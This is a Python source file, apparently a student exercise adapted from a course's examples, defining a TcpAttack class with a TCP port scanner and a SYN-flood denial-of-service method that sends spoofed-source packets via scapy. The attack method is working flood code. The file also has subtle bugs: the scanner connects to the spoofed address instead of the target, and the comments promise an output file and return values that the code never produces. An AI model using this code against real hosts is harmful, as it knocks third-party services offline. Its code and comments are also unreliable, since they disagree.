from sys import *
from BitVector import *
from scapy.all import *
from scapy.layers.inet import IP, TCP
import socket

###########################################################################################
# This code is taken and modified from Professor Kak's implementations port_scan and DOS  #
###########################################################################################

class TcpAttack:
    #spoofIP: string containing the IP addy to spoof
    #targetIP: string containing the IP addy to attack
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    ###########################################
    # rangeStart = int designating first port to be scanned
    # rangeEnd = int designating the last port in the range
    # no return value, but writes open ports to openports.txt
    def scanTarget(self, rangeStart, rangeEnd):
        ## Scans target computer for open ports, using the range of ports passed,
        ## and writes ALL open ports to openports.txt
        open_ports = []
        for testport in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.spoofIP, testport))
                open_ports.append(testport)
                sys.stdout.write("%s" % testport)                                   
                sys.stdout.flush()
            except:
                sys.stdout.write(".")                                                
                sys.stdout.flush() 

    #####################################
    # port = int designating attack port
    # numSyn = int of SYN packets to send to target IP addy at the given port
    def attackTarget(self, port, numSyn):
        ## if port is open, perform DoS attack and return 1, else return 0
        for i in range(numSyn):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as e:
                print(e)